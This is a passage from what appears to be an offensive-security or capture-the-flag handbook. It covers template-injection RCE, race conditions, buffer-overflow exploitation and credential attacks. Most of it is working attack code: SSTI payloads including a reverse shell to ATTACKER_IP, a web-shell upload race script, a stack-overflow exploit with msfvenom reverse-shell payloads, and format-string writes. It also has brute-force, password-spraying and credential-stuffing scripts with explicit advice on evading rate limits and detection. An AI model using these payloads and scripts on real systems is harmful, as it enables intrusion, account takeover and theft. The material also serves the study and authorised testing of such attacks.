#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

### ERB Template Injection (Ruby/Rails)

**Detection**

```erb
<%= 7*7 %>
<%= File.open('/etc/passwd').read %>
```

**RCE Exploitation**

```erb
# Execute system commands
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>

# Reverse shell
<%= IO.popen('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1').read %>
```

### Smarty Template Injection (PHP)

**Detection**

```smarty
{$smarty.version}
{php}echo 'test';{/php}
```

**RCE Exploitation**

```smarty
# PHP execution (older versions)
{php}system('id');{/php}

# Static method call
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('id'); ?>",self::clearConfig())}

# Using {literal} bypass
{literal}<?php system('id');?>{/literal}
```

### Template Injection Tools

**tplmap** (Automated SSTI scanner)

```bash
# Basic scan
python2 tplmap.py -u 'http://target.com/page?name=*'

# Specify injection point
python2 tplmap.py -u 'http://target.com/page' -d 'name=*'

# Execute command
python2 tplmap.py -u 'http://target.com/page?name=*' --os-shell

# Upload file
python2 tplmap.py -u 'http://target.com/page?name=*' --upload LOCAL REMOTE
```

**SSTImap**

```bash
# Interactive mode
python3 sstimap.py -i

# Automated detection and exploitation
python3 sstimap.py -u 'http://target.com/page?name=test' --crawl 2
```

---

## Race Conditions

### Concept Overview

Race conditions occur when application behavior depends on timing/sequence of events, creating exploitable windows between check and use operations.

### TOCTOU (Time-of-Check-Time-of-Use)

**File Upload Race Conditions**

```bash
# Upload malicious file repeatedly while attempting to access it
# Terminal 1: Upload loop
while true; do
    curl -X POST -F "file=@shell.php" http://target.com/upload
done

# Terminal 2: Access attempt loop
while true; do
    curl http://target.com/uploads/shell.php?cmd=id
done
```

**Python Automation**

```python
import requests
import threading

target = "http://target.com"
upload_url = f"{target}/upload"
execute_url = f"{target}/uploads/shell.php"

def upload():
    while True:
        files = {'file': open('shell.php', 'rb')}
        requests.post(upload_url, files=files)

def execute():
    while True:
        try:
            r = requests.get(f"{execute_url}?cmd=id", timeout=1)
            if "uid=" in r.text:
                print("[+] Success!")
                print(r.text)
                break
        except:
            pass

# Start threads
threading.Thread(target=upload).start()
threading.Thread(target=execute).start()
```

### Payment/Balance Race Conditions

**Concurrent Transaction Exploitation**

```python
import requests
import threading

def make_purchase(session_cookie):
    cookies = {'session': session_cookie}
    # Purchase with insufficient funds
    requests.post('http://target.com/purchase', 
                  data={'item': 'expensive_item'}, 
                  cookies=cookies)

# Send multiple simultaneous requests
threads = []
for i in range(20):
    t = threading.Thread(target=make_purchase, args=('YOUR_COOKIE',))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### Session/Token Race Conditions

**Password Reset Race Condition**

```bash
# Send multiple password reset requests simultaneously
seq 1 100 | xargs -P 100 -I {} curl -X POST http://target.com/reset \
    -d "email=victim@example.com"
```

**Coupon/Voucher Reuse**

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def use_coupon(code):
    return requests.post('http://target.com/apply_coupon', 
                        data={'code': code},
                        cookies={'session': 'YOUR_COOKIE'})

# Use same coupon multiple times simultaneously
with ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(use_coupon, 'COUPON123') for _ in range(50)]
    results = [f.result() for f in futures]
```

### Resource Access Race Conditions

**Symlink Race Condition**

```bash
# Exploit predictable temporary file creation
#!/bin/bash
TARGET="/tmp/predictable_file"
LINK="/path/to/sensitive/file"

while true; do
    rm -f $TARGET
    ln -sf $LINK $TARGET
done &

# Trigger vulnerable application
./vulnerable_app
```

### Database Race Conditions

**SQL Injection with Race Condition**

```python
import requests
import threading

def exploit():
    # Exploit timing window in SQL query
    requests.get('http://target.com/item?id=1 AND SLEEP(5)')

# Multiple concurrent requests
for _ in range(10):
    threading.Thread(target=exploit).start()
```

### Tools for Race Condition Testing

**Turbo Intruder (Burp Suite Extension)**

```python
# Turbo Intruder script for race conditions
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=1,
                          pipeline=False)
    
    # Queue requests to be sent simultaneously
    for i in range(50):
        engine.queue(target.req, gate='race1')
    
    # Open gate to send all at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Race The Web**

```bash
# Install
go get github.com/aaronjanse/race-the-web

# Configuration file (config.toml)
[request]
method = "POST"
url = "http://target.com/endpoint"
body = "param=value"
count = 50
```

---

## Memory Corruption Exploits

### Buffer Overflow Fundamentals

**Stack Buffer Overflow Detection**

```python
# Fuzzing for buffer overflow
import socket

target = "192.168.1.100"
port = 9999

buffer = b"A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(buffer)
        s.close()
        buffer += b"A" * 100
        print(f"Sent {len(buffer)} bytes")
    except:
        print(f"Crashed at {len(buffer)} bytes")
        break
```

### Pattern Generation and Offset Finding

**Using Metasploit Pattern Tools**

```bash
# Generate unique pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

# Find offset from crashed EIP value
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6A413969

# Alternative with pwntools
python3 -c "from pwn import *; print(cyclic(3000))"
python3 -c "from pwn import *; print(cyclic_find(0x6a413969))"
```

### Bad Character Identification

```python
# Generate bad character string (exclude 0x00)
badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
    b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
    # ... continue through 0xff
)

# Send and compare in debugger (Immunity/GDB)
```

### Finding JMP ESP Address

**Using mona.py (Immunity Debugger)**

```
!mona modules  # Find modules without protections
!mona find -s "\xff\xe4" -m module.dll  # Find JMP ESP (FFE4)
!mona jmp -r esp -cpb "\x00\x0a\x0d"  # Find JMP ESP excluding bad chars
```

**Using ROPgadget**

```bash
ROPgadget --binary vulnerable_binary --only "jmp|call" | grep esp
```

**Manual with GDB/PEDA**

```bash
gdb ./vulnerable_binary
peda> jmpcall esp
peda> ropgadget
```

### Exploit Development Workflow

**Basic Stack Overflow Exploit Structure**

```python
import socket

target = "192.168.1.100"
port = 9999

offset = 524  # Found via pattern_offset
jmp_esp = b"\x01\x02\x03\x04"  # Address in little-endian
nops = b"\x90" * 16

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -b "\x00" -f python
shellcode = b"\xda\xc1\xba\x37\x5b..."  # Your shellcode here

payload = b"A" * offset
payload += jmp_esp
payload += nops
payload += shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.send(payload)
s.close()
```

### Shellcode Generation

**msfvenom Common Payloads**

```bash
# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -f python

# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00\x0a\x0d" -f python

# Meterpreter payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -f python -e x86/shikata_ga_nai

# Staged vs stageless
msfvenom -p windows/shell/reverse_tcp  # Staged (smaller, needs handler)
msfvenom -p windows/shell_reverse_tcp  # Stageless (larger, standalone)
```

### Heap Overflow Exploitation

**[Inference]** Heap exploitation techniques vary significantly by allocator implementation and protections. Basic concepts include:

**Use-After-Free Detection**

```c
// Vulnerable pattern
char *ptr = malloc(100);
free(ptr);
// ... later ...
strcpy(ptr, "data");  // Use after free
```

**Heap Spraying (Browser exploitation context)**

```javascript
// Spray heap with controlled data
var spray = unescape("%u9090%u9090");  // NOP sled
while (spray.length < 0x100000) spray += spray;

var memory = new Array();
for (i = 0; i < 200; i++) {
    memory[i] = spray + shellcode;
}
```

### Format String Vulnerabilities

**Detection**

```bash
# Test inputs
%x %x %x %x
%p %p %p %p
%s %s %s %s
AAAA.%x.%x.%x.%x  # Look for 41414141
```

**Reading Memory**

```bash
# Read specific addresses
%<position>$s  # Read string at position
%<position>$x  # Read hex value at position

# Example: Read address 0x08049000
\x00\x90\x04\x08%7$s
```

**Writing Memory**

```bash
# Write to arbitrary address
%<value>c%<position>$n  # Write value to position

# Example: Write 0x41414141 to address
\x00\x90\x04\x08%1094795585c%7$n
```

### Protection Bypass Techniques

**DEP/NX Bypass via ROP**

```bash
# Find ROP gadgets
ROPgadget --binary vulnerable_binary

# Common gadget chains
ropper --file vulnerable_binary --search "pop rdi"
```

**ASLR Bypass Information Leak**

```python
# Leak libc address via format string
payload = b"%3$p"  # Leak stack address
# Calculate offset to known libc function
```

**Stack Canary Bypass**

```python
# Brute force canary byte-by-byte (forking servers)
for byte in range(256):
    payload = b"A" * offset + bytes([byte])
    # If no crash, byte is correct
```

### Tools for Memory Corruption

**GDB with Extensions**

```bash
# PEDA
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# pwndbg
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# GEF
bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

**Pwntools**

```python
from pwn import *

# Connect to target
conn = remote('target.com', 1337)
# or
conn = process('./vulnerable_binary')

# Interact
conn.sendline(payload)
conn.interactive()

# Packing addresses
address = p32(0x41414141)  # 32-bit
address = p64(0x4141414141414141)  # 64-bit
```

**Radare2 for Analysis**

```bash
r2 -d ./vulnerable_binary
> aaa  # Analyze all
> pdf @main  # Disassemble main
> s main  # Seek to main
> dc  # Continue execution
> dr  # Show registers
```

---

## Important Related Topics

- **Return-Oriented Programming (ROP)** for advanced exploitation bypassing modern protections
- **Heap Feng Shui** techniques for reliable heap exploitation
- **Kernel Exploitation** for privilege escalation beyond userland
- **Browser Exploitation** combining multiple memory corruption primitives

---

# Authentication & Credential Attacks

## Brute Force Attacks

Brute force attacks systematically attempt all possible password combinations within a defined character space. While computationally expensive, brute force remains viable against weak passwords, system accounts, and services lacking rate limiting.

**Attack Surface Identification**

Enumerate authentication endpoints before initiating brute force:

```bash
# SSH service enumeration
nmap -p 22 --script ssh-auth-methods target_host
ssh -v username@target_host

# HTTP Basic Authentication
curl -v http://target_host/admin/

# FTP anonymous access verification
ftp target_host
anonymous

# RDP endpoint detection
nmap -p 3389 --script rdp-enum-encryption target_host
```

**Character Space Definition**

Brute force efficiency depends on accurate character space specification:

```bash
# Lowercase only (26 characters)
# 8-character password: 26^8 = 208,827,064,576 combinations

# Lowercase + numbers (36 characters)
# 8-character password: 36^8 = 2,821,109,907,456 combinations

# Full ASCII printable (94 characters)
# 8-character password: 94^8 = 6,095,689,385,410,816 combinations
```

**Custom Wordlist Generation**

Create targeted brute force wordlists:

```bash
# Lowercase alphabetic, 6-8 characters
crunch 6 8 abcdefghijklmnopqrstuvwxyz > wordlist_lower.txt

# Numbers only, 4-6 characters
crunch 4 6 0123456789 > wordlist_numbers.txt

# Common patterns (e.g., Password + Year)
echo "{generating wordlist}"
for year in {2020..2025}; do
  echo "Password$year"
  echo "Passw0rd$year"
done > wordlist_patterns.txt
```

Generate complete character set combinations:

```bash
crunch 8 8 "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$" -o complete_wordlist.txt
```

**SSH Brute Force Attack**

Parallel SSH login attempts using Hydra:

```bash
hydra -l username -P wordlist.txt ssh://target_host -t 4 -v

# Multiple usernames
hydra -L userlist.txt -P wordlist.txt ssh://target_host -t 4

# Custom SSH port
hydra -l username -P wordlist.txt ssh://target_host:2222 -t 4
```

Using Medusa for SSH:

```bash
medusa -h target_host -u username -P wordlist.txt -M ssh -t 4 -v

# Against multiple hosts
medusa -H hostlist.txt -u username -P wordlist.txt -M ssh -t 4
```

Manual SSH brute force with bash loop:

```bash
#!/bin/bash
WORDLIST="wordlist.txt"
TARGET="target_host"
USER="username"

while IFS= read -r password; do
    timeout 5 ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$USER@$TARGET" "exit" <<< "$password" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Success: $password"
        break
    else
        echo "[-] Attempt: $password"
    fi
done < "$WORDLIST"
```

**HTTP Basic Authentication Brute Force**

```bash
hydra -l admin -P wordlist.txt http-basic://target_host/admin/ -v

# Specific HTTP method
hydra -l admin -P wordlist.txt http-basic://target_host/admin/ -m GET -v

# Custom HTTP headers
hydra -l admin -P wordlist.txt http-basic://target_host/admin/ -H "X-Forwarded-For: 127.0.0.1" -v
```

Using Medusa:

```bash
medusa -h target_host -u admin -P wordlist.txt -M http -m HTBasic:/admin/ -v
```

**FTP Brute Force Attack**

```bash
hydra -l admin -P wordlist.txt ftp://target_host -t 4 -v

medusa -h target_host -u admin -P wordlist.txt -M ftp -t 4 -v

# Manual FTP brute force
#!/bin/bash
while IFS= read -r password; do
    ftp -n -v target_host <<EOF
user admin
$password
quit
EOF
done < wordlist.txt
```

**SMTP Authentication Brute Force**

```bash
hydra -l user@domain.com -P wordlist.txt smtp://target_host -t 4 -v

hydra -l user@domain.com -P wordlist.txt smtp-enum://target_host -t 4
```

**RDP Brute Force Attack**

Using Hydra:

```bash
hydra -l administrator -P wordlist.txt rdp://target_host -t 2 -v
```

Using Medusa:

```bash
medusa -h target_host -u administrator -P wordlist.txt -M rdp -t 2 -v
```

Using ncrack (specialized for RDP):

```bash
ncrack -u administrator -P wordlist.txt rdp://target_host:3389 -T5
```

**Rate Limiting and Timing Optimization**

Account for service-imposed delays:

```bash
# Hydra with delay between attempts
hydra -l username -P wordlist.txt ssh://target_host -t 1 -W 60 -v
# -W 60: wait 60 seconds between retries

# Distributed brute force across multiple threads with backoff
hydra -l username -P wordlist.txt ssh://target_host -t 2 --ssl -o output.txt -v
```

**Response Analysis and Filtering**

Differentiate between failed attempts and successful authentication:

```bash
# SSH response parsing
ssh -o ConnectTimeout=2 username@target_host 2>&1 | grep -E "Permission denied|password expires|Accept password"

# HTTP response status code differentiation
curl -s -o /dev/null -w "%{http_code}" -u username:password http://target_host/admin/

# 401/403 indicates authentication failure
# 200 indicates potential success
```

**Time-Based Attack Optimization**

Account for timing-based login throttling:

```bash
#!/bin/bash
# Implement exponential backoff
WORDLIST="wordlist.txt"
TARGET="target_host"
USER="username"
DELAY=1

while IFS= read -r password; do
    timeout 5 ssh -o ConnectTimeout=2 "$USER@$TARGET" "exit" <<< "$password" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Success: $password"
        exit 0
    fi
    sleep $DELAY
    # Optional: increase delay after failed attempts
    # DELAY=$((DELAY + 1))
done < "$WORDLIST"
```

## Dictionary Attacks

Dictionary attacks leverage pre-compiled wordlists of known passwords, common phrases, and probable combinations, significantly reducing computational overhead compared to pure brute force.

**Wordlist Sources and Curation**

Common wordlist repositories:

```bash
# SecLists repository
git clone https://github.com/danielmiessler/SecLists.git

# Rockyou wordlist (most popular)
# Located in SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

# CrackStation wordlist
# https://crackstation.net/

# Default password lists
wget https://raw.githubusercontent.com/defaultpasswordlist/defaultpasswordlist.github.io/master/passwords.txt
```

**Wordlist Processing and Filtering**

Clean and prepare wordlists for target environment:

```bash
# Remove duplicates
sort -u wordlist.txt > wordlist_unique.txt

# Filter by password length (8-12 characters)
awk 'length >= 8 && length <= 12' wordlist.txt > wordlist_filtered.txt

# Extract passwords containing numbers
grep '[0-9]' wordlist.txt > wordlist_numbers.txt

# Remove common false positives (non-ASCII, URLs)
grep -v '[[:space:]]' wordlist.txt | grep -v 'http' > wordlist_clean.txt

# Convert to lowercase
tr '[:upper:]' '[:lower:]' < wordlist.txt > wordlist_lower.txt
```

**Dictionary Attack Against SSH**

```bash
hydra -l username -P rockyou.txt ssh://target_host -t 4 -v

# Multiple usernames with dictionary
hydra -L usernames.txt -P rockyou.txt ssh://target_host -t 4

# Custom wordlist with common password patterns
cat > custom_wordlist.txt << 'EOF'
Password1
Welcome123
Admin@123
Letmein
Qwerty123
Sunshine
Trustno1
Dragon123
Shadow
Monster
EOF

hydra -l admin -P custom_wordlist.txt ssh://target_host -v
```

**Dictionary Attack Against HTTP Forms**

Target web login forms with dictionary wordlist:

```bash
# HTTP POST request brute force
hydra -l admin -P rockyou.txt http-post-form://target_host/login.php:username=^USER^&password=^PASS^:F=incorrect -t 4 -v

# Detailed breakdown:
# -l admin: username
# -P rockyou.txt: password wordlist
# http-post-form: attack method
# target_host/login.php: target URL
# username=^USER^&password=^PASS^: POST parameters
# F=incorrect: failure string (if "incorrect" in response, authentication failed)
```

**Dictionary Attack Against LDAP**

```bash
hydra -l username -P rockyou.txt ldap://target_host -t 4 -v

# LDAP with specific base DN
hydra -l "cn=user,dc=domain,dc=com" -P rockyou.txt ldap://target_host -t 4 -v
```

**Dictionary Attack Against Database Services**

MySQL:

```bash
hydra -l root -P rockyou.txt mysql://target_host -t 4 -v

# Specific port
hydra -l root -P rockyou.txt mysql://target_host:3306 -t 4 -v
```

PostgreSQL:

```bash
hydra -l postgres -P rockyou.txt postgres://target_host -t 4 -v
```

**Hybrid Dictionary Attack**

Combine dictionary words with rules for character substitution and appending:

```bash
# Using John the Ripper with custom rules
cat > custom_rules.txt << 'EOF'
c $1 $2 $3 $4
c $! $@
EOF

john --wordlist=dictionary.txt --rules=custom_rules --stdout > hybrid_wordlist.txt
```

Using hashcat rule engine:

```bash
# Append numbers 0-9 to each dictionary word
hashcat -a 6 dictionary.txt "?d" --stdout > hybrid_wordlist.txt

# Prepend and append numbers
hashcat -a 6 "?d" dictionary.txt "?d" --stdout > hybrid_wordlist.txt

# Common substitutions (l33t speak)
hashcat -a 6 dictionary.txt "?s" --stdout > hybrid_wordlist.txt
```

**Domain-Specific Dictionary Generation**

Create wordlists targeting organization-specific terms:

```bash
# Company name variations
echo "CompanyName" > org_wordlist.txt
echo "Company123" >> org_wordlist.txt
echo "Companyname2024" >> org_wordlist.txt

# Employee names from reconnaissance
echo "james" >> org_wordlist.txt
echo "Sarah" >> org_wordlist.txt
echo "michael.smith" >> org_wordlist.txt

# Combine with generic passwords
cat rockyou.txt org_wordlist.txt > combined_wordlist.txt
sort -u combined_wordlist.txt > final_wordlist.txt
```

**Dictionary Attack Performance Optimization**

Prioritize common passwords:

```bash
# Reorder wordlist by frequency (if frequency data available)
# Top 100 passwords first, then alphabetical
head -100 common_passwords.txt > priority_wordlist.txt
tail -n +101 common_passwords.txt | sort >> priority_wordlist.txt

# Use compressed wordlists to reduce I/O
gunzip -c rockyou.txt.gz | hydra -l admin -P - ssh://target_host -t 4 -v
```

## Password Spraying

Password spraying executes a small set of passwords against many user accounts, avoiding account lockout mechanisms that brute force attacks trigger. This attack is particularly effective in enterprise environments with weak password policies.

**User Account Enumeration (Prerequisite)**

Identify valid usernames before spraying:

```bash
# LDAP enumeration
ldapsearch -x -H ldap://target_host -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName | grep sAMAccountName

# SMTP VRFY command
echo "VRFY user1@domain.com" | nc target_host 25

# HTTP response differentiation
for user in $(cat usernames.txt); do
    curl -s -o /dev/null -w "%{http_code}" -u "$user:password" http://target_host/admin/
done

# NetBIOS enumeration
enum4linux -U target_host | grep user
```

**Password Selection Strategy**

Effective password spraying requires careful password selection:

```bash
# Common default passwords (low false positive rate)
cat > spray_passwords.txt << 'EOF'
Password123
Admin@123
Welcome1
Letmein
Qwerty123
Sunshine
Spring2024
EOF

# Seasonal variations
for season in Spring Summer Fall Winter; do
    for year in 2023 2024 2025; do
        echo "$season$year"
    done
done > seasonal_passwords.txt

# Company-specific patterns
echo "CompanyName2024"
echo "Domain123"
echo "Acme@2024"
```

**Distributed Password Spraying Against Active Directory**

Using Kerbrute (Kerberos pre-authentication):

```bash
# User enumeration via Kerberos
./kerbrute_linux_amd64 userenum --dc target_host -d domain.com usernames.txt

# Password spraying
./kerbrute_linux_amd64 passwordspray --dc target_host -d domain.com usernames.txt "Password123"

# Multiple passwords (low volume)
for password in $(cat spray_passwords.txt); do
    ./kerbrute_linux_amd64 passwordspray --dc target_host -d domain.com usernames.txt "$password" --delay 0
done
```

**LDAP Password Spraying**

```bash
#!/bin/bash
USERS_FILE="users.txt"
PASSWORDS_FILE="passwords.txt"
TARGET="target_host"
DOMAIN="domain.com"

while IFS= read -r password; do
    while IFS= read -r user; do
        ldapsearch -x -H ldap://$TARGET -D "$user@$DOMAIN" -w "$password" -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo "[+] Success: $user:$password"
        fi
    done < "$USERS_FILE"
done < "$PASSWORDS_FILE"
```

**HTTP Form-Based Password Spraying**

```bash
hydra -L users.txt -P passwords.txt http-post-form://target_host/login.php:username=^USER^&password=^PASS^:F=incorrect -t 2 -W 60 -v

# With request rate limiting to avoid detection
hydra -L users.txt -P passwords.txt http-post-form://target_host/login.php:username=^USER^&password=^PASS^:F=incorrect -t 1 -W 120 -v
```

**OWA (Outlook Web Access) Password Spraying**

```bash
# Using DomainPasswordSpray
./DomainPasswordSpray.ps1 -UserList users.txt -Password "Password123" -OutFile results.txt

# Manual OWA spray
#!/bin/bash
for user in $(cat users.txt); do
    curl -s -c cookies.txt -b cookies.txt \
        -d "username=$user@domain.com&password=Password123" \
        https://owa.domain.com/auth.owa \
        | grep -q "The user name or password is incorrect" || echo "[+] $user:Password123"
done
```

**SSH Password Spraying**

```bash
# Hydra SSH spray (single password, multiple users)
hydra -L users.txt -p "Password123" ssh://target_host -t 4 -W 60 -v

# Manual SSH spray with connection reuse
#!/bin/bash
PASSWORD="Password123"
for user in $(cat users.txt); do
    timeout 5 ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$user@target_host" "exit" <<< "$PASSWORD" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Success: $user:$PASSWORD"
    fi
done
```

**Rate Limiting Evasion**

Distribute attacks across time and infrastructure:

```bash
# Slow spray with delays
hydra -L users.txt -P passwords.txt ssh://target_host -t 1 -W 300 -v
# -W 300: 300 second delay between connection attempts

# Distributed spray across multiple attacker IPs (if infrastructure available)
for attacker_ip in attacker1 attacker2 attacker3; do
    ssh $attacker_ip "hydra -L users.txt -P passwords.txt ssh://target_host -t 1 -W 300"
done

# Randomize attempt timing
#!/bin/bash
for user in $(cat users.txt); do
    sleep $(( RANDOM % 120 + 60 ))
    timeout 5 ssh -o ConnectTimeout=2 "$user@target_host" "exit" <<< "Password123" 2>/dev/null
done
```

**Detection Evasion Techniques**

[Inference] Password spraying detection relies on identifying multiple failed authentication attempts. Evade through:

- **Distributed source IPs**: Use proxies or multiple attacker systems
- **Low frequency**: Single attempt per user per day
- **Legitimate traffic patterns**: Mimic normal user behavior (e.g., multiple failed attempts followed by success)
- **Account rotation**: Avoid targeting same account repeatedly

**Account Lockout Threshold Determination**

Enumerate Active Directory lockout policy before spraying:

```powershell
# From compromised system with AD access
net accounts /domain
Get-ADDefaultDomainPasswordPolicy -Identity domain.com | Select-Object LockoutThreshold, LockoutDuration

# Via LDAP query
ldapsearch -x -H ldap://target_host -b "CN=Default Domain Policy,CN=System,DC=domain,DC=com" "lockoutThreshold"
```

[Inference] If lockout threshold is 5 attempts, executing 3 passwords per user distributes risk across accounts.

## Credential Stuffing

Credential stuffing exploits credential dumps from previous breaches, attempting to authenticate using leaked username-password pairs against target systems. This attack assumes password reuse across multiple services.

**Credential Dump Acquisition**

[Unverified] Obtain breached credential lists from public sources (requires careful source verification):

```bash
# Public breach aggregators (use with caution for legal purposes)
# HaveIBeenPwned API
curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/test@example.com" \
    -H "User-Agent: CTF-Research"

# Credential dumps often available in CTF artifacts or provided datasets
# Example format:
# username:password
# user@email.com:Password123
# admin:admin123
```

**Credential Format Normalization**

Process and clean credential dumps:

```bash
# Extract username:password pairs
grep -oP '^[^:]+:[^:]+' credentials.txt > normalized_credentials.txt

# Remove duplicates
sort -u normalized_credentials.txt > credentials_unique.txt

# Filter credentials by domain
grep "@domain.com" credentials.txt > domain_specific_credentials.txt

# Extract unique usernames
cut -d: -f1 credentials.txt | sort -u > usernames_from_dump.txt

# Extract unique passwords for reuse analysis
cut -d: -f2 credentials.txt | sort | uniq -c | sort -rn | head -20
```

**Credential Stuffing Against SSH**

```bash
# Parse credentials and attempt SSH login
#!/bin/bash
TARGET="target_host"

while IFS=: read -r username password; do
    timeout 5 ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no "$username@$TARGET" "exit" <<< "$password" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Success: $username:$password"
        # Save successful credentials
        echo "$username:$password" >> successful_creds.txt
    fi
done < credentials.txt
```

Using Hydra:

```bash
# Convert credentials to Hydra format
awk -F: '{print $1}' credentials.txt > users.txt
awk -F: '{print $2}' credentials.txt > passwords.txt

# Execute credential stuffing
hydra -L users.txt -P passwords.txt ssh://target_host -t 4 -v
```

**Credential Stuffing Against HTTP Services**

```bash
#!/bin/bash
TARGET="http://target_host/login"
CREDENTIALS="credentials.txt"

while IFS=: read -r username password; do
    response=$(curl -s -c cookies.txt -b cookies.txt \
        -d "username=$username&password=$password" \
        "$TARGET" 2>/dev/null)
    
    # Check for success indicators
    if echo "$response" | grep -q "Welcome\|Dashboard\|Success" || ! echo "$response" | grep -q "incorrect\|failed"; then
        echo "[+] Success: $username:$password"
        echo "$username:$password" >> successful_creds.txt
    fi
done < "$CREDENTIALS"
```

**Credential Stuffing Against RDP**

Using Medusa with credential pairs:

```bash
# Create comma-separated credential file
awk -F: '{print $1","$2}' credentials.txt > rdp_credentials.txt

medusa -h target_host -C rdp_credentials.txt -M rdp -t 2 -v
```

**API Authentication Credential Stuffing**

```bash
#!/bin/bash
API_ENDPOINT="https://api.target_host/login"

while IFS=: read -r username password; do
    response=$(curl -s -X POST "$API_ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$username\",\"password\":\"$password\"}" 2>/dev/null)
    
    # Parse JSON response for auth token
    if echo "$response" | grep -q "token\|success" && ! echo "$response" | grep -q "error"; then
        echo "[+] Success: $username:$password"
        token=$(echo "$response" | grep -oP '"token":"?\K[^"]*' | head -1)
        echo "$username:$password:$token" >> successful_creds.txt
    fi
done < credentials.txt
```

**Credential Reuse Analysis**

Identify high-value credentials appearing in multiple dumps:

```bash
# Find credentials appearing in multiple breach datasets
comm -12 <(sort dump1.txt) <(sort dump2.txt) > common_credentials.txt

# Prioritize password frequency across dumps
cut -d: -f2 credentials.txt | sort | uniq -c | sort -rn | head -50

# Identify organizational email patterns
grep -E "@company\.[a-z]+|@[a-z]+\.local" credentials.txt > org_credentials.txt
```

**Scale Analysis and Targeting**

Determine credential stuffing scope:

```bash
# Count unique usernames
wc -l usernames_unique.txt

# Count unique passwords
wc -l passwords_unique.txt

# Calculate success rate estimate (if partial data available)
# Successful_attempts / total_attempts * 100
```

**Detection Evasion in Credential Stuffing**

[Inference] Credential stuffing detection relies on identifying multiple failed authentication attempts from single or distributed sources.

Evasion techniques:

```bash
# Randomize timing between attempts
#!/bin/bash
while IFS=: read -r username password; do
    sleep $(( RANDOM % 120 + 60 ))
    # Authentication attempt
done < credentials.txt

# Distributed attack across proxies
for proxy in proxy1 proxy2 proxy3; do
    curl -x $proxy -d "username:password" http://target_host/login
done

# Rotate User-Agent headers
curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    -d "username:password" http://target_host/login
```

## Hash Cracking (MD5, SHA, NTLM, Kerberos)

Hash cracking recovers plaintext passwords from cryptographic hashes. Success depends on hash algorithm strength, password entropy, and available computational resources.

**Hash Identification**

Determine hash algorithm from format:

```bash
# MD5 (128-bit, 32 hex characters)
# 5f4dcc3b5aa765d61d8327deb882cf99

# SHA-1 (160-bit, 40 hex characters)
# 356a192b7913b04c54574d18c28d46e6395428ab

# SHA-256 (256-bit, 64 hex characters)
# e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

# SHA-512 (512-bit, 128 hex characters)
# cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e

# NTLM (Windows, 32 hex characters, format: username:domain:LM:NTLM)
# 4d967a2a137cbef6c4352b8a256613dc:4d967a2a137cbef6c4352b8a256613dc

# Kerberos TGT (AS-REP) (format: $krb5asrep$...)
# $krb5asrep$23$user@domain.com:hash_data

# bcrypt (variable length, format: $2a$cost$salt$hash)
# $2a$10$SlFQSdhFubMQUqkR5nKhPuYvMHMZvfPHYEbl0iMqmT2uVLT0O7y1K
```

Using hash-identifier tool:

```bash
hash-identifier
# Interactive tool for hash type determination

# Automated detection
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hash-identifier
```

**MD5 Hash Cracking**

[Inference] MD5 is cryptographically broken and should not be used for password storage. However, MD5 remains prevalent in legacy systems.

```bash
# Rainbow table lookup (if hash in precomputed tables)
# Online services like md5online.com, crackstation.net (for CTF/educational use)

# Local dictionary attack
john --format=raw-md5 --wordlist=rockyou.txt hashes.txt

hashcat -a 0 -m 0 hashes.txt rockyou.txt
# -a 0: dictionary attack
# -m 0: MD5 hash type

# Hybrid attack (dictionary + rules)
hashcat -a 6 -m 0 hashes.txt dictionary.txt "?d?d?d?d"
# Appends 4 digits to each dictionary word

# Brute force (for short passwords)
hashcat -a 3 -m 0 hashes.txt "?l?l?l?l?l?l?l?l"
